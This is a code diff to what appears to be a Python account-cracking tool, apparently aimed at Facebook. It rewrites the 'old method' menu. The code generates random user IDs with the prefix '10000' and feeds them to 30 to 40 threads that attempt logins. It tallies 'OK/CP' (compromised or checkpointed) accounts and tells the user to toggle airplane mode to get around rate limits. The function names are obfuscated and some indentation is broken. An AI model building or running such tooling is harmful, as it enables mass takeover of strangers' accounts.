@@ -545,25 +545,30 @@ class _G_i_F_t_:
             pass
  
 #-_-_-_-_-_-_-_-<-OLD-MENU->-_-_-_-_-_-_-_-#
-    def ___OLDX___():
-    clear();print(f'\x1b[38;5;46m•\x1b[1;97m EXAMPLE \x1b[38;5;197m:\x1b[38;5;46m 9999 \x1b[1;97m|\x1b[38;5;46m 99999 \x1b[1;97m|\x1b[38;5;46m 999999 \x1b[1;97m|\x1b[38;5;46m 9999999 ');linex();limit = int(input(f'\x1b[38;5;46m•\x1b[1;97m SELECT  \x1b[38;5;197m:\x1b[38;5;46m '))
-    clear()
-    print(f'\x1b[38;5;46m•\x1b[1;97m 1 METHOD D1 \x1b[38;5;46m- \x1b[1;97mGRAPH\n\x1b[38;5;46m•\x1b[1;97m 2 METHOD D2 \x1b[38;5;46m- \x1b[1;97mB-GRAPH');linex()
-    mthd=input(f'\x1b[38;5;46m•\x1b[1;97m CHOICE \x1b[38;5;197m: \x1b[38;5;46m')
-    rangex="10000"
-    for i in range(int(limit)):
-        data=str(random.choice(range(1000000000,1999999999)))
-        user.append(data)
-    with tred(max_workers=40) as crack_submit:
-        clear();total_ids=str(len(user))
-        clear();print(f"\x1b[38;5;46m•\x1b[1;97m USER NAME \x1b[38;5;197m:\x1b[38;5;46m {username}");print(f"\x1b[38;5;46m•\x1b[1;97m TOKEN \x1b[38;5;197m:\x1b[38;5;46m {xxd}");linex()
-        print(f'\x1b[38;5;46m•\x1b[1;97m TOTAL UID \x1b[38;5;197m:\x1b[38;5;46m {total_ids} ');print(f'\x1b[38;5;46m•\x1b[1;97m IF NO RESULT {A}(\x1b[38;5;46mON{A}|\x1b[38;5;197mOFF{A}) AIRPLAN MODE \x1b[1;97m(\x1b[38;5;46mD\x1b[38;5;197m{mthd}{A}) ');linex()
-        for HopXd in user:
-            uid=rangex+HopXd
-            if mthd in ['1','01']:
-                crack_submit.submit(__method__1,uid,total_ids)
-            if mthd in ['2','02']:
-                crack_submit.submit(__method__2,uid,total_ids)
+    def _O_i_D_(self):
+    	clear()
+    	print(_L_i_M_i_T_)
+    	linex()
+    	_o_L_d_L_i_M_i_T_ = int(input(f"{vbv} INPUT LIMIT {vcv} "))
+    	_Y_e_A_r_ = '10000'
+    	for i in range(_o_L_d_L_i_M_i_T_):
+    	    nmp = str(random.choice(range(1000000000,1999999999)))
+    	    self.gen.append(nmp)
+    	with ThreadPool(max_workers=30) as __OL__:
+    	    total_ids = _o_L_d_L_i_M_i_T_
+    	    clear()
+    	    print(f"{vb} TOTAL IDS {vcv} {total_ids} ")
+    	    print(f"{vb} IF NO RESULT TURN ON{G}/{W}OFF APN MODE EVERY 5 MIN")
+    	    linex()
+    	    for love in self.gen:
+    	        ids = _Y_e_A_r_ + love
+   	        __OL__.submit(self._O_l_D_,ids)
+    	print("\033[1;37m")
+    	linex()
+    	print(f"{vb} THE PROCESS HAS COMPLETED...!")
+    	print(f"{vb} TOTAL OK/CP {vcv}{B} "+str(len(self.oks))+f"{G}/{Y}"+str(len(self.cps)))
+    	linex()
+    	print(f"{vb} THANKS FOR USING.....! ")
 #-_-_-_-_-_-_-_-<-OLD-M->-_-_-_-_-_-_-_-#
     def _O_l_D_(self,ids):
     	try:
